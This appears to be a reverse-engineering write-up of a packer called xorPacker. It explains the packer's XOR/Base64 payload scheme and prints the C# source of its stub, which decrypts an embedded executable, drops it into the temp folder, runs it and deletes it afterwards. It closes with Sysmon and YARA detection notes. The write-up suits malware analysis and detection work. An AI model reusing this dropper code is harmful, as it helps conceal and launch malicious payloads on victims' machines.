# 🔬 xorPacker & xorStub Complete Source Deconstruction & Forensic Mapping
Author: Maya Thorne (Systems & Reverse Engineering Research)
License: MT-SRL

## 1. Architectural Overview
`xorPacker` is an educational/adversarial PE injector implementing a 2-stage XOR cipher with an overlay dropper mechanism:
1. **Target PE Ingestion**: Reads bytes of target PE executable.
2. **Key Generation**: Generates 25-character random ASCII uppercase key (`randomKey`).
3. **Payload Cipher**:
   - `file = Base64(UTF8(XOR(Base64(TargetPE), randomKey)))`
4. **Key Cipher**:
   - `encKey = Base64(UTF8(XOR(randomKey, "randomkey")))`
5. **Overlay Append**:
   - Formats payload: `***` + `file` + `|` + `encKey`
   - Appends text to EOF (PE Overlay) of template binary `xorStub.exe`.

## 2. xorStub Runtime Extraction & Dropper Pipeline
```csharp
// Source: xorStub/Program.cs
using (StreamReader streamReader = new StreamReader(Assembly.GetEntryAssembly().Location)) {
    using (BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream)) {
        byte[] stubBytes = binaryReader.ReadBytes((int)streamReader.BaseStream.Length);
        string stubSettings = Encoding.ASCII.GetString(stubBytes).Substring(
            Encoding.ASCII.GetString(stubBytes).IndexOf("***")
        ).Replace("***", "");

        // Step 1: Invert Key Cipher with hardcoded key 'randomkey'
        string randomKey = ROT13Encode(
            Encoding.UTF8.GetString(Convert.FromBase64String(stubSettings.Split('|')[1])),
            "randomkey"
        );

        // Step 2: Invert Payload Cipher with recovered dynamic key
        string cipheredFile = stubSettings.Split('|')[0];
        byte[] bytesBack = Convert.FromBase64String(
            ROT13Encode(
                Encoding.UTF8.GetString(Convert.FromBase64String(cipheredFile)),
                randomKey
            )
        );

        // Step 3: Write payload to %TEMP%\<random>.exe
        string fileName = RandomUtil.GetRandomString();
        string dropPath = Path.Combine(Path.GetTempPath(), fileName + ".exe");
        File.WriteAllBytes(dropPath, bytesBack);

        // Step 4: Execute Dropped Binary
        Process p = new Process();
        p.StartInfo.FileName = dropPath;
        p.EnableRaisingEvents = true;
        p.Exited += (s, e) => {
            File.Delete(dropPath); // Anti-forensics self-deletion
            Environment.Exit(0);
        };
        p.Start();
    }
}
```

## 3. Detection Telemetry & Mitigations
- **Sysmon EID 11**: File drop into `%LOCALAPPDATA%\Temp\*.exe`.
- **Sysmon EID 1**: Process execution from temporary directories spawned by non-installer parents.
- **YARA**: Matching `***` followed by Base64 payload and Base64 key string.
